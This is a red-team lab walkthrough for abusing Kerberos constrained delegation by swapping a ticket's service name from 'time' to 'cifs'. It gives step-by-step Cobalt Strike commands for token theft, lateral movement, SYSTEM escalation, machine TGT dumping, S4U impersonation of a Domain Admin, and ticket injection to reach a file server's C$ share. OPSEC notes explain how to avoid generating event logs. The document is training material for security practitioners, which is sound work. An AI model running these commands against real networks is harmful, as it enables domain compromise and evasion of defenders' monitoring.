# Constrained Delegation with Service Name Substitution Kerberos Lab

>The objective of this lab is to abuse constrained delegation using an alternate service name.

**Concept:** When constrained delegation is configured for a non-CIFS service (e.g. `time/lon-fs-1`), a service ticket for that SPN can have its service class swapped in the unencrypted portion of the ticket (e.g. `time` → `cifs`). The target server only validates the encrypted portion — it never checks the SPN in the unencrypted PAC — so the substituted ticket is accepted. This turns a restricted delegation into full file system access without needing CIFS in `msDS-AllowedToDelegateTo`.

===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Find constrained delegation targets — note the value in `msDS-AllowedToDelegateTo` (e.g. `time/lon-fs-1`). You will need the exact SPN in the exploitation step.  

    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
    ```

    > OPSEC-🟢SAFE — BOF, runs in beacon thread, no child process.

⚠️ Expected output: `lon-ws-1$` with `msDS-AllowedToDelegateTo: time/lon-fs-1`. The service is `time`, not `cifs` — that is the point of this lab.

===

## Lateral Movement to lon-ws-1

Goal: get a beacon running as SYSTEM on `lon-ws-1` so we can access the machine account logon session (LUID `0x3e7`) and dump its TGT.

1. Find a process owned by `rsteel` (Workstation Admin on lon-ws-1):

    ```cs
    beacon> ps
    // Look for cmd.exe, mmc.exe owned by CONTOSO\rsteel
    ```

2. Steal the token:

    ```cs
    beacon> steal_token <rsteel-pid>    // OPSEC-🟢SAFE — no logon event, no child process
    beacon> getuid                       // confirm CONTOSO\rsteel
    ```

3. Set spawnto before jumping:

    ```cs
    beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
    // dllhost.exe = COM surrogate — blends with normal system activity
    // Standard CS equivalent if ak-settings not loaded:
    beacon> spawnto x64 %windir%\sysnative\dllhost.exe
    ```

4. Jump to lon-ws-1 — winrm64 first (retry once on ERROR_FILE_NOT_FOUND), then scshell64:

    ```cs
    // OPSEC-🟢SAFE — preferred, no service, no Event 7045/7040
    beacon> jump winrm64 lon-ws-1 smb_custom
    // If ERROR_FILE_NOT_FOUND → wait 10-15s → retry once before falling to scshell64

    // OPSEC-🟠CAUTION — fallback, Event 7040 x2, transient disk write
    beacon> jump scshell64 lon-ws-1 smb_custom

    beacon> rev2self    // drop rsteel token on source beacon after jump succeeds
    ```

5. On the new lon-ws-1 beacon — verify SYSTEM context:

    ```cs
    beacon> getuid
    ```

    **If `getuid` returns `CONTOSO\rsteel` (not SYSTEM)** — this happens when `jump winrm64` is used. WinRM injects into `wsmprovhost.exe` running as the authenticated user, not SYSTEM. Escalate:

    ```cs
    beacon> getsystem    // OPSEC-🟠CAUTION — named pipe impersonation from admin context
    beacon> getuid       // confirm NT AUTHORITY\SYSTEM
    ```

    > `steal_token <SYSTEM-pid>` will fail with `ERROR_ACCESS_DENIED` from a rsteel wsmprovhost.exe context — even though rsteel is local admin, the WinRM session token lacks `SeDebugPrivilege`. Use `getsystem` instead.
    >
    > `jump scshell64` lands as SYSTEM directly (runs via service context) — `getsystem` not needed.

===

## Exploitation

### Step 1 — Dump the machine account TGT

LUID `0x3e7` is the machine account logon session — always present on any domain-joined host, always SYSTEM-accessible.

```cs
beacon> krb_dump /luid:3e7 /service:krbtgt
```

> OPSEC-🟠CAUTION — BOF, uses `LsaCallAuthenticationPackage` Kerberos API — not a raw LSASS memory read, but EDR hooks on this API will still fire.

> ⚠️ **Lab-confirmed (2026-04-19):** Use `/luid:3e7` — do NOT prefix with `0x`. Kerbeus-BOF rejects `/luid:0x3e7` and returns `[x] Invalid luid`.

⚠️ Copy the entire base64 TGT blob — passed to `krb_s4u` next.

> **Check `krb_triage` output first — DA TGT may already be cached:**
> After `getsystem`, `krb_triage` shows all sessions on the host. If a Domain Admin TGT is cached (e.g. `Administrator @ CONTOSO.COM | krbtgt/CONTOSO.COM`), dump it directly — skip S4U entirely:
> ```cs
> beacon> krb_dump /user:Administrator /service:krbtgt
> ```
> Lab confirmed (2026-04-19): Administrator TGT was cached on lon-ws-1 at LUID `0x7940d`. Direct DA path — no delegation abuse required.

Verify ticket before using:

```cs
beacon> krb_describe /ticket:[base64-TGT]    // OPSEC-🟢SAFE — BOF, read-only
```

---

### Step 2 — S4U abuse with service name substitution

Use the machine TGT to request a service ticket for the delegated SPN (`time/lon-fs-1`), then substitute the service class to `cifs`. The resulting ticket is valid for `cifs/lon-fs-1` impersonating Administrator.

```Beacon-nocolor
krb_s4u /ticket:[base64-TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
```

> OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write.

⚠️ `/service:time/lon-fs-1` must exactly match the value in `msDS-AllowedToDelegateTo` from enumeration — if the delegation target is different in your lab, substitute accordingly.

⚠️ `/altservice:cifs` replaces the service class in the unencrypted ticket header. The KDC-signed encrypted portion is unchanged — the target host accepts it.

⚠️ `krb_s4u` outputs a base64-encoded service ticket. Copy the full base64 string from the beacon output — you need it in Step 3.

---

### Step 3 — Save the service ticket on the attacker machine

Run this on the attacker CS client (local PowerShell — **not** via beacon):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET]"))
```

> The `.kirbi` file is written to your **attacker desktop only** — nothing touches the target's disk. `kerberos_ticket_use` reads from the CS client and injects over the C2 channel.

---

### Step 4 — Inject the ticket and access the share

Back in the beacon on `lon-ws-1`:

```cs
// make_token is OPTIONAL when beacon is SYSTEM — lab-confirmed (2026-04-19)
// kerberos_ticket_use injects directly into the SYSTEM logon session
// lon-fs-1 sees Administrator authenticating regardless of local session identity

// Option A — skip make_token (OPSEC-🟢SAFE — no Event 4648, lab-confirmed working)
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
beacon> ls \\lon-fs-1\c$

// Option B — with make_token (OPSEC-🟠CAUTION — Event 4648 logged, cleaner session)
beacon> make_token CONTOSO\Administrator FakePass!
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
beacon> ls \\lon-fs-1\c$
```

> **Why Option A works:** The injected `cifs/lon-fs-1` service ticket is presented to lon-fs-1 during the network auth. The remote server only validates the Kerberos ticket — it never checks what the local logon session identity is. SYSTEM context is sufficient to hold and present the injected ticket.

⚠️ If `ls \\lon-fs-1\c$` returns `ACCESS_DENIED`:
- `krb_triage` — confirm `cifs/lon-fs-1` ticket is present in current session
- Verify SPN in `krb_s4u` exactly matches `msDS-AllowedToDelegateTo` from ldapsearch
- Check ticket expiry with `krb_describe /ticket:[base64]`

```cs
beacon> rev2self
beacon> kerberos_ticket_purge    // purge injected ticket from SYSTEM session
```

===

⚠️ In this lab, you abused constrained delegation with service name substitution — taking a delegation configured only for `time/lon-fs-1` and turning it into a usable `cifs/lon-fs-1` ticket impersonating a Domain Admin, without ever touching LSASS directly or requiring the Administrator's credentials.
